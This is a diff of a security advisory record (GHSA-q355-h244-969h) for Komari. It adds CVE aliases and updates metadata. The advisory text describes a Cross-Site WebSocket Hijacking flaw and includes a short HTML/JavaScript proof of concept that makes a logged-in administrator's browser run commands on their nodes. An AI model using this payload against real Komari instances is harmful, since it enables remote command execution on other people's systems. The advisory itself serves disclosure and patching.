@@ -24,6 +24,10 @@
       ]
     }
   ],
+  "aliases": [
+    "CVE-2025-55300",
+    "GO-2025-3874"
+  ],
   "database_specific": {
     "cwe_ids": [
       "CWE-1385"
@@ -35,7 +39,7 @@
   },
   "details": "### Summary\n\nWebSocket upgrader has disabled origin checking, enabling Cross-Site WebSocket Hijacking (CSWSH) attacks against authenticated users\n\n### Details\n\nhttps://github.com/komari-monitor/komari/blob/bd5a6934e1b79a12cf1e6a9bba5372d0e04f3abc/api/terminal.go#L33-L35\n\nAny third party website can send requests to the terminal websocket endpoint with browser's cookies, resulting in remote code execution\n\n### PoC\n\n1. Login in to your komari instance\n2. Hosting the following HTML code on internet, replace `<komari-addr>` and `<target-uuid>` into yours\n3. Visit this HTML page, you can see your node is executing `uptime` without your actions\n\n```\n<pre></pre>\n<script>\nconst socket = new WebSocket(\"wss://<komari-addr>/api/admin/client/<target-uuid>/terminal\");\nsocket.addEventListener(\"open\", (event) => {\n  const binaryBlob = new Blob(['uptime\\n'], { type: 'application/octet-stream' });\n  socket.send(binaryBlob);\n});\nsocket.addEventListener(\"message\", (event) => {\n  event.data.text().then(x => {document.querySelector(\"pre\").append(x)});\n});\n</script>\n```\n\n### Impact\n\nAn administrator of a Komari instance will execute commands on their nodes unnoticed when visiting a malware page.",
   "id": "GHSA-q355-h244-969h",
-  "modified": "2025-08-12T00:13:29Z",
+  "modified": "2025-08-19T04:59:36.107083Z",
   "published": "2025-08-12T00:13:28Z",
   "references": [
     {
@@ -59,7 +63,7 @@
       "url": "https://github.com/komari-monitor/komari/releases/tag/1.0.4-fix2"
     }
   ],
-  "schema_version": "1.7.0",
+  "schema_version": "1.7.3",
   "severity": [
     {
       "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
